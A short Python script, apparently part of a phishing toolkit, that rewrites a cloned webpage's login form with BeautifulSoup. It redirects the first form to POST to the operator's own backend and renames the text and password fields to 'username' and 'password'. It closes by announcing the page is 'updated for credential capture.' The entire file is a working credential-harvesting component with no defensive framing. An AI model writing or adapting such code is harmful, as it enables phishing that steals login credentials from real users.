#This is code is used to modify the html script that is obtained from the webpage_clone.sh program
#This code uses Beautifulsoup which is a pythn library that manipulate html and xml file

from bs4 import BeautifulSoup

# Read the original HTML
with open("index.html", "r") as file:
    soup = BeautifulSoup(file, "html.parser")

# Find the first form tag
form = soup.find("form")
if form:
    form["action"] = "/"  # Set form action to your backend route
    form["method"] = "POST"  # Make sure the method is POST

    # Fix input fields (if not already set)
    inputs = form.find_all("input")
    for input_tag in inputs:
        if input_tag.get("type") == "text":
            input_tag["name"] = "username"
        elif input_tag.get("type") == "password":
            input_tag["name"] = "password"

# Save the modified HTML
with open("index.html", "w") as file:
    file.write(str(soup))

print("[+] HTML file updated for credential capture.")